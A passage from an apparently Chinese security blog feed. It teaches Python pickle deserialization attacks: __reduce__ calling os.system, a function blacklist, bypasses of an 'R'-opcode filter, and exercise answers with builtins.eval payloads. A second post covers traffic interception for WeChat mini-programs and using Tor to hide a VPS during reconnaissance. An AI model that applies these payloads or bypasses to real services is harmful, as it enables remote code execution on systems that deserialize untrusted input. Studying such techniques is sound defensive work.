class="built_in">print</span>(obj.openfile)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95&quot;\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x04test\x93\x8c\x051.txt\x8c\x05aaaaa\x86R.&#x27;</span><br><span class="line">0: \x80 PROTO      4</span><br><span class="line">2: \x95 FRAME      34</span><br><span class="line">11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="line">21: \x8c SHORT_BINUNICODE &#x27;test&#x27;</span><br><span class="line">27: \x93 STACK_GLOBAL</span><br><span class="line">28: \x8c SHORT_BINUNICODE &#x27;1.txt&#x27;</span><br><span class="line">35: \x8c SHORT_BINUNICODE &#x27;aaaaa&#x27;</span><br><span class="line">42: \x86 TUPLE2</span><br><span class="line">43: R    REDUCE</span><br><span class="line">44: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line">aaaaa</span><br><span class="line">&lt;_io.BufferedWriter name=&#x27;1.txt&#x27;&gt;</span><br></pre></td></tr></table></figure><p>可以看到序列化数据中没有 file 属性了。当对象被 Pickle 时，优先调用<strong>reduce</strong>方法。该方法可返回一个代表全局名称的字符串或一个元组，元组包含 2 到 5 个元素，包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被 pickle 的列表元素的迭代器（可选）；一个产生被 pickle 的字典元素的迭代器（可选）。</p><h3 id="reduce执行命令"><a class="markdownIt-Anchor" href="#reduce执行命令"></a> <strong>reduce</strong>执行命令</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> os.system, (<span class="string">&quot;whoami&quot;</span>,)</span><br><span class="line">……</span><br><span class="line"><span class="built_in">print</span>(optdata)</span><br><span class="line">pickletools.dis(optdata)</span><br><span class="line">obj = pickle.loads(optdata)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x06whoami\x85R.&#x27;</span><br><span class="line">0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      24</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;nt&#x27;</span><br><span class="line">   15: \x8c SHORT_BINUNICODE &#x27;system&#x27;</span><br><span class="line">   23: \x93 STACK_GLOBAL</span><br><span class="line">   24: \x8c SHORT_BINUNICODE &#x27;whoami&#x27;</span><br><span class="line">   32: \x85 TUPLE1</span><br><span class="line">   33: R    REDUCE</span><br><span class="line">   34: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line">chocopc\choco</span><br></pre></td></tr></table></figure><p>注意字节流中“R”表示 apply callable to argtuple, both on stack，既<strong>reduce</strong>方法</p><h1 id="python-反序列化利用方法"><a class="markdownIt-Anchor" href="#python-反序列化利用方法"></a> python 反序列化利用方法</h1><p>基本利用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">optdata=<span class="string">b&#x27;\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x06whoami\x85R.&#x27;</span></span><br><span class="line">obj = pickle.loads(optdata)</span><br></pre></td></tr></table></figure><h2 id="通过reduce直接执行命令黑名单绕过"><a class="markdownIt-Anchor" href="#通过reduce直接执行命令黑名单绕过"></a> 通过<strong>reduce</strong>直接执行命令黑名单绕过</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [<span class="string">&#x27;Ichown&#x27;</span>, <span class="string">&#x27;Istat&#x27;</span>, <span class="string">&#x27;Popen&#x27;</span>, <span class="string">&#x27;access&#x27;</span>, <span class="string">&#x27;call&#x27;</span>, <span class="string">&#x27;call_tracing&#x27;</span>, <span class="string">&#x27;chdir&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;check_call&#x27;</span>, <span class="string">&#x27;check_output&#x27;</span>, <span class="string">&#x27;chmod&#x27;</span>, <span class="string">&#x27;chown&#x27;</span>, <span class="string">&#x27;chroot&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;compile command&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy2&#x27;</span>, <span class="string">&#x27;copyfile&#x27;</span>, <span class="string">&#x27;copyfileobj&#x27;</span>, <span class="string">&#x27;dup&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;dup2&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;execl&#x27;</span>, <span class="string">&#x27;execle&#x27;</span>, <span class="string">&#x27;execlp&#x27;</span>, <span class="string">&#x27;execv&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;execve&#x27;</span>, <span class="string">&#x27;execvp&#x27;</span>, <span class="string">&#x27;execvpe&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;fchdir&#x27;</span>, <span class="string">&#x27;fchmod&#x27;</span>, <span class="string">&#x27;fchown&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;fdopen&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;fileopen&#x27;</span>, <span class="string">&#x27;fork&#x27;</span>, <span class="string">&#x27;forkpty&#x27;</span>, <span class="string">&#x27;getline&#x27;</span>, <span class="string">&#x27;getoutput&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;getstatus&#x27;</span>, <span class="string">&#x27;getstatusoutput&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;interact&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>, <span class="string">&#x27;lchown&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;listdir&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;lstat&#x27;</span>, <span class="string">&#x27;make_archive&#x27;</span>, <span class="string">&#x27;makedirs&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;mkdir&#x27;</span>, <span class="string">&#x27;mkfifo&#x27;</span>, <span class="string">&#x27;mknod&#x27;</span>, <span class="string">&#x27;move&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;opendir&#x27;</span>, <span class="string">&#x27;openpty&#x27;</span></span><br><span class="line">   , <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;popen3&#x27;</span>, <span class="string">&#x27;popen4&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;readlink&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;removedirs&#x27;</span>, <span class="string">&#x27;rename&#x27;</span>, <span class="string">&#x27;renames&#x27;</span>, <span class="string">&#x27;repeat&#x27;</span>, <span class="string">&#x27;rmdir&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;spawnl&#x27;</span>, <span class="string">&#x27;spawnle&#x27;</span>, <span class="string">&#x27;spawnlp&#x27;</span>, <span class="string">&#x27;spawnlpe&#x27;</span>, <span class="string">&#x27;spawnv&#x27;</span>, <span class="string">&#x27;spawnve&#x27;</span>, <span class="string">&#x27;spawnvp&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;spawnvpe&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;tempnam&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tmpfile&#x27;</span>, <span class="string">&#x27;tmpnam&#x27;</span>, <span class="string">&#x27;unlink&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;walk&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找不再黑名单里的函数绕……上面的黑名单比较全吧，综合了几个能找到的黑名单函数。</p><h2 id="过滤reduce方法利用-1"><a class="markdownIt-Anchor" href="#过滤reduce方法利用-1"></a> 过滤<strong>reduce</strong>方法利用 1</h2><p>例，过滤 R 操作符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">demo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;test&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = demo()</span><br><span class="line">picdata = pickle.dumps(obj)</span><br><span class="line">picdata=pickletools.optimize(picdata)</span><br><span class="line"><span class="built_in">print</span>(picdata)</span><br><span class="line">pickletools.dis(picdata)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> picdata:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line">obj = pickle.loads(picdata)</span><br><span class="line"><span class="built_in">print</span>(obj.name)</span><br></pre></td></tr></table></figure><p>确实没法命令执行，但是可以获取其他文件信息。一串正常的反序列化字节流：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95#\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x04demo\x93)\x81&#125;\x8c\x04name\x8c\x04testsb.&#x27;</span><br><span class="line">0: \x80 PROTO      4</span><br><span class="line">2: \x95 FRAME      35</span><br><span class="line">11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="line">21: \x8c SHORT_BINUNICODE &#x27;demo&#x27;</span><br><span class="line">27: \x93 STACK_GLOBAL</span><br><span class="line">28: )    EMPTY_TUPLE</span><br><span class="line">29: \x81 NEWOBJ</span><br><span class="line">30: &#125;    EMPTY_DICT</span><br><span class="line">31: \x8c SHORT_BINUNICODE &#x27;name&#x27;</span><br><span class="line">37: \x8c SHORT_BINUNICODE &#x27;test&#x27;</span><br><span class="line">43: s    SETITEM</span><br><span class="line">44: b    BUILD</span><br><span class="line">45: .    STOP</span><br></pre></td></tr></table></figure><p>利用方法：在目录中添加文件 <a href="http://flag.py">flag.py</a>，文件内容：<code>flag=&quot;&#123;wosiflag&#125;&quot;</code>修改反序列化数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evaldata=<span class="string">b&#x27;\x80\x04\x95#\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x04demo\x93)\x81&#125;\x8c\x04name\x8c\x04flag\x8c\x04flag\x93sb.&#x27;</span></span><br><span class="line">pickletools.dis(evaldata)</span><br><span class="line">obj = pickle.loads(evaldata)</span><br><span class="line"><span class="built_in">print</span>(obj.name)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      35</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="line">   21: \x8c SHORT_BINUNICODE &#x27;demo&#x27;</span><br><span class="line">   27: \x93 STACK_GLOBAL</span><br><span class="line">   28: )    EMPTY_TUPLE</span><br><span class="line">   29: \x81 NEWOBJ</span><br><span class="line">   30: &#125;    EMPTY_DICT</span><br><span class="line">   31: \x8c SHORT_BINUNICODE &#x27;name&#x27;</span><br><span class="line">   37: \x8c SHORT_BINUNICODE &#x27;flag&#x27;</span><br><span class="line">   43: \x8c SHORT_BINUNICODE &#x27;flag&#x27;</span><br><span class="line">   49: \x93 STACK_GLOBAL</span><br><span class="line">   50: s    SETITEM</span><br><span class="line">   51: b    BUILD</span><br><span class="line">   52: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line">&#123;wosiflag&#125;</span><br></pre></td></tr></table></figure><p>实现效果：name=flag.flag</p><h2 id="过滤reduce方法利用-2"><a class="markdownIt-Anchor" href="#过滤reduce方法利用-2"></a> 过滤<strong>reduce</strong>方法利用 2</h2><p>注意到操作符 b：<code>BUILD = b'b' # call __setstate__ or __dict__.update()</code><strong>setstate</strong>使用 demo：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">noreduce</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, test</span>):</span><br><span class="line">        <span class="built_in">print</span>(test)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;aaaaa&quot;</span></span><br><span class="line">        self.age = <span class="number">25</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = noreduce()</span><br><span class="line">picdata = pickletools.optimize(pickle.dumps(obj))</span><br><span class="line">pickletools.dis(picdata)</span><br><span class="line">objr = pickle.loads(picdata)</span><br><span class="line">objr.__setstate__(<span class="string">&quot;dddddd&quot;</span>)</span><br></pre></td></tr></table></figure><p>利用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">noreduce</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;aaaaa&quot;</span></span><br><span class="line">        self.age = <span class="number">25</span></span><br><span class="line">        self.__setstate__ = os.system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = noreduce()</span><br><span class="line">picdata = pickletools.optimize(pickle.dumps(obj))</span><br><span class="line"><span class="built_in">print</span>(picdata)</span><br><span class="line">pickletools.dis(picdata)</span><br><span class="line">objr = pickle.loads(picdata)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x04\x95K\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x08noreduce\x93)\x81&#125;(\x8c\x04name\x8c\x05aaaaa\x8c\x03ageK\x19\x8c\x0c__setstate__\x8c\x02nt\x8c\x06system\x93ub.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line">    <span class="number">2</span>: \x95 FRAME      <span class="number">75</span></span><br><span class="line">   <span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;__main__&#x27;</span></span><br><span class="line">   <span class="number">21</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;noreduce&#x27;</span></span><br><span class="line">   <span class="number">31</span>: \x93 STACK_GLOBAL</span><br><span class="line">   <span class="number">32</span>: )    EMPTY_TUPLE</span><br><span class="line">   <span class="number">33</span>: \x81 NEWOBJ</span><br><span class="line">   <span class="number">34</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">35</span>: (    MARK</span><br><span class="line">   <span class="number">36</span>: \x8c     SHORT_BINUNICODE <span class="string">&#x27;name&#x27;</span></span><br><span class="line">   <span class="number">42</span>: \x8c     SHORT_BINUNICODE <span class="string">&#x27;aaaaa&#x27;</span></span><br><span class="line">   <span class="number">49</span>: \x8c     SHORT_BINUNICODE <span class="string">&#x27;age&#x27;</span></span><br><span class="line">   <span class="number">54</span>: K        BININT1    <span class="number">25</span></span><br><span class="line">   <span class="number">56</span>: \x8c     SHORT_BINUNICODE <span class="string">&#x27;__setstate__&#x27;</span></span><br><span class="line">   <span class="number">70</span>: \x8c     SHORT_BINUNICODE <span class="string">&#x27;nt&#x27;</span></span><br><span class="line">   <span class="number">74</span>: \x8c     SHORT_BINUNICODE <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">82</span>: \x93     STACK_GLOBAL</span><br><span class="line">   <span class="number">83</span>: u        SETITEMS   (MARK at <span class="number">35</span>)</span><br><span class="line">   <span class="number">84</span>: b    BUILD</span><br><span class="line">   <span class="number">85</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">4</span></span><br></pre></td></tr></table></figure><p>修改字节流：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">picdata=b&#x27;\x80\x04\x95K\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x08noreduce\x93)\x81&#125;(\x8c\x04name\x8c\x05aaaaa\x8c\x03ageK\x19\x8c\x0c__setstate__\x8c\x02nt\x8c\x06system\x93ub\x8c\x06whoamib.&#x27;</span><br><span class="line">pickletools.dis(picdata)</span><br><span class="line">objr = pickle.loads(picdata)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">    0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      75</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="line">   21: \x8c SHORT_BINUNICODE &#x27;noreduce&#x27;</span><br><span class="line">   31: \x93 STACK_GLOBAL</span><br><span class="line">   32: )    EMPTY_TUPLE</span><br><span class="line">   33: \x81 NEWOBJ</span><br><span class="line">   34: &#125;    EMPTY_DICT</span><br><span class="line">   35: (    MARK</span><br><span class="line">   36: \x8c     SHORT_BINUNICODE &#x27;name&#x27;</span><br><span class="line">   42: \x8c     SHORT_BINUNICODE &#x27;aaaaa&#x27;</span><br><span class="line">   49: \x8c     SHORT_BINUNICODE &#x27;age&#x27;</span><br><span class="line">   54: K        BININT1    25</span><br><span class="line">   56: \x8c     SHORT_BINUNICODE &#x27;__setstate__&#x27;</span><br><span class="line">   70: \x8c     SHORT_BINUNICODE &#x27;nt&#x27;</span><br><span class="line">   74: \x8c     SHORT_BINUNICODE &#x27;system&#x27;</span><br><span class="line">   82: \x93     STACK_GLOBAL</span><br><span class="line">   83: u        SETITEMS   (MARK at 35)</span><br><span class="line">   84: b    BUILD</span><br><span class="line">   85: \x8c SHORT_BINUNICODE &#x27;whoami&#x27;</span><br><span class="line">   93: b    BUILD</span><br><span class="line">   94: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line">chocopc\choco</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>序列化字节流第一次 build 读取栈顶，构造好了对象，加入字符串 whoami 后再次 build，相当于调用<code>noreduce.__setstate__(&quot;whoami&quot;)</code></p><h1 id="一些练习题"><a class="markdownIt-Anchor" href="#一些练习题"></a> 一些练习题</h1><p>1.手动构造下述类的序列化数据class practice:def <strong>init</strong>(self):self.name=&quot;aaaaa&quot;self.age=25 2.使用<strong>reduce.<strong>方法打印 <a href="http://flag.py">flag.py</a> 中的 flag 值3.data 可控的情况下，构造序列化数据，输出 flagclass demo:def <strong>init</strong> (self):self.age=12self.study=['a','b','c']data=b&quot;if b'R'in data:print(&quot;danger&quot;)exit()obj=pickle.loads(data)print(obj.study) 4.使用</strong>setstate</strong>打印 flag 的值</p><p>答案：</p><ol><li>b'\x80\x04\x95K\x00\x00\x00\x00\x00\x00\x00\x8c\x08<strong>main</strong>\x8c\x04demo\x93)\x81}(\x8c\x04name\x8c\x05aaaaa\x8c\x03ageK\x19sb.'</li><li>b'\x80\x04\x95\x22\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x8c\x04eval\x93\x8c\x10print(flag.flag)\x85R.'</li><li>b'\x80\x04\x95#\x00\x00\x00\x00\x00\x00\x00\x8c\x08<strong>main</strong>\x8c\x04demo\x93)\x81}\x8c\x05study\x8c\x04flag\x8c\x04flag\x93sb.'</li><li>b'\x80\x04\x95K\x00\x00\x00\x00\x00\x00\x00\x8c\x08<strong>main</strong>\x8c\x04demo\x93)\x81(\x8c\x04name\x8c\x05aaaaa\x8c\x03ageK\x19\x8c\x0c<strong>setstate</strong>\x8c\x08builtins\x8c\x04eval\x93ub\x8c\x10print(flag.flag)b.'</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从pc端微信小程序抓包环境搭建学习代理链和CA证书 以羊了个羊为例</title>
      <link href="/2022/09/22/%E4%BB%8Epc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%90%86%E9%93%BE%E5%92%8CCA%E8%AF%81%E4%B9%A6%20%E4%BB%A5%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A%E4%B8%BA%E4%BE%8B/"/>
      <url>/2022/09/22/%E4%BB%8Epc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%90%86%E9%93%BE%E5%92%8CCA%E8%AF%81%E4%B9%A6%20%E4%BB%A5%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A%E4%B8%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>绝大多数安卓模拟器与 wsl 冲突，之前搭好的安卓模拟器抓包环境不能用，气死我了！！突然看到<a href="https://mp.weixin.qq.com/s/woZUSKweln47mGZnt_JB2g">https://mp.weixin.qq.com/s/woZUSKweln47mGZnt_JB2g</a>，搭建 pc 端的程序抓包环境，遂尝试一二，并学习记录了其中的知识盲区。又是从笔记搬到博客的屑Proxifier 真的真的很好用</p></blockquote> <span id="more"></span><h1 id="工具介绍"><a class="markdownIt-Anchor" href="#工具介绍"></a> 工具介绍</h1><h2 id="proxifier"><a class="markdownIt-Anchor" href="#proxifier"></a> Proxifier</h2><p>Proxifier 是一款代理客户端软件，可以让不支持代理服务器工作的程序变的可行。支持各种操作系统和各代理协议，它的运行模式可以指定端口，指定程序的特点。</p><p>我理解就是指定某个程序走特定的代理服务器。比如本次环境搭建就是让微信小程序的流量通过代理的方式经过 Charles，然后 Charles 的流量代理到 BP，所以 Proxifier 是本次环境搭建的核心，实际上直接使用 Proxifier+Burpsuite 也是可以的。PS:wsl 会和 Proxifier 冲突，解决方法参考：<a href="https://github.com/dyingsu/nolsp">https://github.com/dyingsu/nolsp</a></p><h2 id="charles"><a class="markdownIt-Anchor" href="#charles"></a> Charles</h2><p>Charles 是在 PC 端常用的网络封包截取工具，在做移动开发时，我们为了调试与服务器端的网络通讯协议，常常需要截取网络封包来分析。除了在做移动开发中调试端口外，Charles 也可以用于分析第三方应用的通讯协议。配合 Charles 的 SSL 功能，Charles 还可以分析 Https 协议。Charles 主要的功能包括：</p><ul><li>截取 Http 和 Https 网络封包。</li><li>支持重发网络请求，方便后端调试。</li><li>支持修改网络请求参数。</li><li>支持网络请求的截获并动态修改。</li><li>支持模拟慢速网络。</li></ul><p>注意一点就是抓 HTTPS 的流量需要安装 Charles 证书到受信任的根证书颁发机构。</p><p>文章中提到反向代理，扫盲文章：</p><h2 id="burpsuite"><a class="markdownIt-Anchor" href="#burpsuite"></a> Burpsuite</h2><p>dddd</p><h2 id="fiddler"><a class="markdownIt-Anchor" href="#fiddler"></a> Fiddler</h2><p>还是 🐏 的攻略，这里使用 Fiddler 进行抓包，之前没接触过，看到 FiddlerScript 比较感兴趣，浅试了一下。3.4.1 破解见附件用法：</p><h1 id="代理链"><a class="markdownIt-Anchor" href="#代理链"></a> 代理链</h1><p>流量会从小程序会通过 Proxifier 走到 Charles 工具，然后 Charles 走代理到 Burpsuite，最后使用 Burpsuite 来进行修改和重放，其实就是走了一个代理链（多级转发代理），上手试一遍就基本会了。不过在搜代理链时，看到更多的是逃避检测，tor，洋葱路由，暗网技术，瞬间来劲了。</p><h3 id="tor"><a class="markdownIt-Anchor" href="#tor"></a> Tor</h3><p>Tor 是什么？The Onion Router，洋葱路由，一个软件。Tor 是一个三重代理，Tor 客户端先与目录服务器通信获得全球活动中继节点信息，然后再随机选择三个节点组成电路(circuit)，用户流量跳跃这三个节点(hop)之后最终到达目标网站服务器，这样 Tor 网络中就有两种实体，分别是用户和中继节点。当用户需要匿名访问网络时，首先访问目录服务器，得到全球的 Tor 中继节点的信息，包括 IP 地址、公钥、出口策略、带宽和在线时间等。然后再随机选择三个节点组成电路(circuit)，分别为入口节点、中间节点和出口节点。在构建电路时，用户和每一个中继节点协商共享的会话密钥，之后将层层加密的信息发送到电路中，每个中继节点经过一次解密后，将信息发给下一个节点。这样，中继节点中只有入口节点知道通信发起者的身份。中间节点知道通道中入口节点和出口节点的身份，但是不知道匿名通信发起者和接收者的身份。出口节点作为网关负责 Tor 网络和外部 Internet 网络的应用层连接，并充当加密的 Tor 网络传输流量和非加密的 Internet 传输流量之间的中继，知道匿名通信接收者的身份。在这种设计下，电路中没有任何一个节点知道完整的信息，因此实现了匿名通信。更多细节可以参考：单从逃避检测，防止溯源上来说，该文章简单介绍了如何利用 tor 来隐藏 vps 的 ip、该文章介绍用公共代理（试过了，用不了，暂时没有解决方法）和 ProxyChains 实现匿名，随便搜的，质量一般，有空可以试一下。作用是在前期信息收集时可以更好的隐藏 ip，缺点肯定是比较慢吧，还有感觉用 tor 的话应该都是国外 ip，比较明显，不知道国内 tor 环境咋样。</p><h1 id="证书与-ca"><a class="markdownIt-Anchor" 